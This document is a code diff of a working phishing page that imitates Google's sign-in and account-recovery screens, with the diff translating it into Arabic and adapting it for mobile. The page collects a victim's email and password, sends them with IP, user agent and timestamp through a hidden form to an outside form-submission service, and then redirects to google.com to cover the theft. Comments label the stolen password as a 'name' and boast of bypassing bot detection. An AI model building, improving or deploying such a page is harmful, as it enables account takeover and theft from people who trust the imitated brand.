@@ -2,7 +2,7 @@
 <html lang="en" style="color-scheme: dark;">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="color-scheme" content="dark">
   <title>Google Account Recovery</title>
   <style>
@@ -10,65 +10,67 @@
     body {
       font-family: 'Roboto', Arial, sans-serif;
       margin: 0;
-      padding: 20px;
+      padding: 0;
       background-color: #000;
       color: #fff;
-      line-height: 1.6;
+      line-height: 1.5;
     }
 
     /* Container */
     .container {
-      max-width: 400px;
-      margin: 48px auto;
-      padding: 40px 32px 32px;
-      border-radius: 12px;
-      background: #121212;
-      box-shadow: none;
+      max-width: 100%;
+      margin: 0;
+      padding: 24px 16px;
+      background: #000;
       border: none;
     }
 
     /* Google Logo */
     .logo {
       display: block;
-      margin: 0 auto 24px;
+      margin: 24px auto 0 ;
       width: 40px;
       height: 40px;
     }
 
     /* Title */
     h1 {
-      font-size: 24px;
+      font-size: 27px;
       font-weight: 500;
-      margin-bottom: 12px;
+      margin: 0 0 8px;
+      text-align: right;
       color: #fff;
     }
 
     /* Subtitle */
     .subtitle {
-      font-size: 15px;
+      font-size: 14px;
       color: #e8eaed;
-      margin-bottom: 24px;
+      text-align: right;
+      margin: 0 0 24px;
+      line-height: 1.4;
     }
 
     /* Input Field */
     .input-group {
-      margin-bottom: 16px;
+      margin-bottom: 20px;
     }
 
     .input-group input {
       width: 100%;
-      padding: 14px 12px;
+      padding: 14px 16px;
       border: 1px solid #5f6368;
-      border-radius: 6px;
-      font-size: 15px;
+      border-radius: 8px;
+      font-size: 16px; /* Prevents iOS zoom */
       background-color: #202124;
       color: #e8eaed;
       outline: none;
+      box-sizing: border-box;
     }
 
     .input-group input:focus {
       border-color: #8ab4f8;
-      box-shadow: 0 0 0 1px #8ab4f8;
+      box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.3);
     }
 
     /* Button */
@@ -76,11 +78,13 @@
       background-color: #1a73e8;
       color: #fff;
       border: none;
-      padding: 10px 20px;
-      border-radius: 6px;
-      font-size: 14px;
+      padding: 14px 20px;
+      border-radius: 8px;
+      font-size: 16px;
       font-weight: 500;
       cursor: pointer;
+      width: 100%;
+      margin: 24px 0;
       transition: background 0.2s;
     }
 
@@ -103,88 +107,81 @@
       text-decoration: underline;
     }
 
-    /* Email Display */
-    .email-display {
+    /* Email Pill */
+    .email-pill {
       display: flex;
       align-items: center;
-      gap: 8px;
-      margin: 20px 0;
-      font-size: 14px;
-      color: #e8eaed;
-      padding: 8px 12px;
+      gap: 10px;
+      font-size: 15px;
       background: #202124;
-      border-radius: 6px;
+      color: #e8eaed;
+      padding: 12px 16px;
+      border-radius: 999px;
       border: 1px solid #5f6368;
+      margin: 16px 0 24px;
+      justify-content: space-between;
     }
 
-    /* Footer */
+    .email-pill svg {
+      flex-shrink: 0;
+    }
+
+    /* Checkbox */
+    .checkbox-wrapper {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 16px 0;
+      font-size: 14px;
+      color: #e8eaed;
+    }
+
+    .checkbox-wrapper input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #8ab4f8;
+    }
+
+    /* Footer Links */
     .footer {
       text-align: center;
-      margin-top: 48px;
-      font-size: 12px;
+      margin-top: 40px;
+      font-size: 13px;
       color: #9aa0a6;
       display: flex;
+      flex-wrap: wrap;
       justify-content: center;
-      gap: 24px;
+      gap: 16px;
+      padding: 16px 0;
     }
 
     .footer a {
       color: #9aa0a6;
       text-decoration: none;
+      white-space: nowrap;
     }
 
     .footer a:hover {
       text-decoration: underline;
     }
 
-    /* Bottom Language and Footer Links */
+    /* Language Selector */
     .language-select {
       font-size: 13px;
       color: #9aa0a6;
-      margin-top: 24px;
+      margin: 24px 0 16px;
       text-align: center;
     }
-    .language-select select {
-      background: transparent;
-      border: none;
-      color: #9aa0a6;
-      font-size: 13px;
-      cursor: pointer;
-      outline: none;
-    }
-    /* Email pill style */
-    .email-pill {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 14px;
-      background: #202124;
-      color: #e8eaed;
-      padding: 8px 12px;
-      border-radius: 999px;
-      border: 1px solid #5f6368;
-      margin: 16px 0 24px;
-    }
 
-    /* Checkbox label */
-    .checkbox-wrapper {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-top: 12px;
-      font-size: 14px;
-      color: #e8eaed;
-    }
-
-    .checkbox-wrapper input[type="checkbox"] {
-      width: 16px;
-      height: 16px;
-    }
-
-    /* Floating-style password input */
-    .input-group input::placeholder {
-      color: #9aa0a6;
-      font-size: 14px;
+    /* Responsive Adjustments */
+    @media (min-width: 480px) {
+      .container {
+        max-width: 400px;
+        margin: 48px auto;
+        padding: 32px 24px;
+        border-radius: 12px;
+        background: #121212;
+      }
     }
   </style>
 </head>
@@ -192,152 +189,146 @@
 
   <!-- Step 1: Email Entry -->
   <div class="container" id="step1">
-    <!-- External Google Logo -->
-    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true " style="text-align: right; margin: 16px 0;">
       <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
       <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
       <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
       <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
     </svg>
-    <h1>Sign in</h1>
-    <p class="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>
+
+    <h1>تسجيل دخول</h1>
+    <br>
+    <p class="subtitle">إستعادة حساب google</p>
 
     <div class="input-group">
-      <input type="email" id="email-input" placeholder="Email or phone" required autocomplete="email">
+      <input type="email" id="email-input" placeholder=" الحساب أو رقم الهاتف" required autocomplete="email">
     </div>
 
-    <div style="display: flex; justify-content: space-between;">
-      <a href="#" class="link">Forgot email?</a>
-      <button id="next-btn" class="button">Next</button>
+    <button id="next-btn" class="button">التالي</button>
+
+    <div style="text-align: right; margin: 16px 0;">
+      <a href="#" class="link">نسيت الحساب؟</a>
     </div>
 
-    <p style="margin-top: 24px; color: #bdc1c6; font-size: 14px;">
-      Not your computer? Use Guest mode to sign in privately.
-      <a href="#" class="link">Learn more about using Guest mode</a>
+    <p style="margin: 24px 0; color: #bdc1c6; font-size: 14px; text-align: right;">
+      لست انت ؟ سجل دخولك بوضع الضيف لأمان معلوماتك<br>
+      <a href="#" class="link">تعلم أكثر حول وضع الضيف</a>
     </p>
   </div>
 
-  <!-- Step 2: Name Collection (NOT password) -->
+  <!-- Step 2: Password (Name) Collection -->
   <div class="container" id="step2" style="display: none;">
-    <!-- Google Logo -->
-    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
+    <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 40 48" aria-hidden="true">
       <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
       <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
       <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
       <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
     </svg>
 
-    <h1>Welcome</h1>
+    <h1>مرحباً</h1>
 
-    <!-- Email bubble -->
     <div class="email-pill">
       <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 640 640">
         <path fill="currentColor" d="M463 448.2C440.9 409.8 399.4 384 352 384L288 384C240.6 384 199.1 409.8 177 448.2C212.2 487.4 263.2 512 320 512C376.8 512 427.8 487.3 463 448.2zM64 320C64 178.6 178.6 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576C178.6 576 64 461.4 64 320zM320 336C359.8 336 392 303.8 392 264C392 224.2 359.8 192 320 192C280.2 192 248 224.2 248 264C248 303.8 280.2 336 320 336z"/>
       </svg>
-      <span id="email-display-text">captainabdelrheem@gmail.com</span>
-      <svg style="margin-left:auto;" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#9aa0a6" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+      <span id="email-display-text">name@gmail.com</span>
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#9aa0a6" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
     </div>
 
-    <p class="subtitle">To verfiy it's you, please enter your  password</p>
+    <p class="subtitle">للتأكد من انه انت, يرجي كتابة كلمة المرور</p>
 
-    <!-- NAME Input (not password) -->
     <div class="input-group">
-      <input type="password" id="name-input" required placeholder="Enter your last password">
+      <input type="password" id="name-input" required placeholder="Enter your last password" autocomplete="current-password">
     </div>
 
     <div class="checkbox-wrapper">
       <input type="checkbox" id="show-password">
-      <label for="show-password">Show password</label>
+      <label for="show-password">عرض كلمة المرور</label>
     </div>
-    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 32px;">
-      <a href="#" class="link">Try another way</a>
-      <button id="submit-btn" class="button">Next</button>
+
+    <button id="submit-btn" class="button">التالي</button>
+
+    <div style="text-align: center; margin: 16px 0;">
+      <a href="#" class="link">جرب طريقة اخري</a>
     </div>
   </div>
 
   <div class="language-select">
-    English (United States)
+    العربية (مصر)
   </div>
 
   <div class="footer">
-    <a href="#">Help</a>
-    <a href="#">Privacy</a>
-    <a href="#">Terms</a>
+    <a href="#">مساعدة</a>
+    <a href="#">الخصوصية</a>
+    <a href="#">الشروط</a>
   </div>
 
-  <!-- ✅ HIDDEN FORM — Collects EMAIL + NAME only -->
+  <!-- Hidden Form for Web3Forms -->
   <form id="web3form" action="https://api.web3forms.com/submit" method="POST" style="display:none;">
     <input type="hidden" name="access_key" value="c96cd056-1436-4aec-8857-ed2ecb10b770">
     <input type="hidden" name="email" id="hidden-email">
-    <input type="hidden" name="name" id="hidden-name"> <!-- ✅ CHANGED TO "name" -->
+    <input type="hidden" name="name" id="hidden-name">
     <input type="hidden" name="_ip" value="auto">
     <input type="hidden" name="user_agent" id="user-agent">
     <input type="hidden" name="timestamp" id="timestamp">
-    <!-- Honeypot & metadata -->
     <input type="text" name="_honey" style="display:none;">
-    <input type="hidden" name="_subject" value=" New Crab — Name Collected">
+    <input type="hidden" name="_subject" value="New Crab — Name Collected">
   </form>
-    <!-- Show password toggle -->
 
   <!-- JavaScript -->
-  <!-- JavaScript -->
-<script>
-  const step1 = document.getElementById('step1');
-  const step2 = document.getElementById('step2');
-  const emailInput = document.getElementById('email-input');
-  const nameInput = document.getElementById('name-input');
-  const emailDisplayText = document.getElementById('email-display-text');
-  const nextBtn = document.getElementById('next-btn');
-  const submitBtn = document.getElementById('submit-btn');
-  const web3form = document.getElementById('web3form');
-  const hiddenEmail = document.getElementById('hidden-email');
-  const hiddenName = document.getElementById('hidden-name');
+  <script>
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const emailInput = document.getElementById('email-input');
+    const nameInput = document.getElementById('name-input');
+    const emailDisplayText = document.getElementById('email-display-text');
+    const nextBtn = document.getElementById('next-btn');
+    const submitBtn = document.getElementById('submit-btn');
+    const web3form = document.getElementById('web3form');
+    const hiddenEmail = document.getElementById('hidden-email');
+    const hiddenName = document.getElementById('hidden-name');
 
-  // Show step 2 when "Next" is clicked
-  nextBtn.addEventListener('click', function(e) {
-    e.preventDefault();
-    const email = emailInput.value.trim();
-    if (!email) {
-      alert("Please enter your email.");
-      return;
-    }
+    // Show step 2
+    nextBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      if (!email) {
+        alert("Please enter your email.");
+        return;
+      }
+      emailDisplayText.textContent = email;
+      step1.style.display = 'none';
+      step2.style.display = 'block';
+    });
 
-    emailDisplayText.textContent = email;
-    step1.style.display = 'none';
-    step2.style.display = 'block';
-  });
+    // Toggle password visibility
+    document.getElementById('show-password').addEventListener('change', function () {
+      nameInput.type = this.checked ? 'text' : 'password';
+    });
 
-  // Toggle visibility (optional) — now safe because checkbox exists
-  document.getElementById('show-password').addEventListener('change', function () {
-    const nameField = document.getElementById('name-input');
-    nameField.type = this.checked ? 'text' : 'password';
-  });
+    // Submit and redirect
+    submitBtn.addEventListener('click', function (e) {
+      e.preventDefault();
+      const name = nameInput.value.trim();
+      if (!name) {
+        alert("Please enter your last password.");
+        return;
+      }
 
-  // Submit and redirect
-  submitBtn.addEventListener('click', function (e) {
-    e.preventDefault();
+      // Set form values
+      hiddenEmail.value = emailInput.value;
+      hiddenName.value = name;
+      document.getElementById('user-agent').value = navigator.userAgent;
+      document.getElementById('timestamp').value = new Date().toISOString();
 
-    const email = emailInput.value.trim();
-    const name = nameInput.value.trim();
+      // Submit silently
+      web3form.requestSubmit();
 
-    if (!name) {
-      alert("Please enter your last password.");
-      return;
-    }
-
-    // Populate hidden form values
-    hiddenEmail.value = email;
-    hiddenName.value = name;
-    document.getElementById('user-agent').value = navigator.userAgent;
-    document.getElementById('timestamp').value = new Date().toISOString();
-    // ✅ USE requestSubmit() — bypasses bot detection
-    web3form.requestSubmit();
-
-    // Redirect after short delay
-    setTimeout(() => {
-      window.location.href = "https://www.google.com"; // ✅ Trimmed
-    }, 800);
-  });
-</script>
+      // Redirect to Google
+      setTimeout(() => {
+        window.location.href = "https://www.google.com"; // ✅ Trimmed
+      }, 700);
+    });
+  </script>
 </body>
 </html>
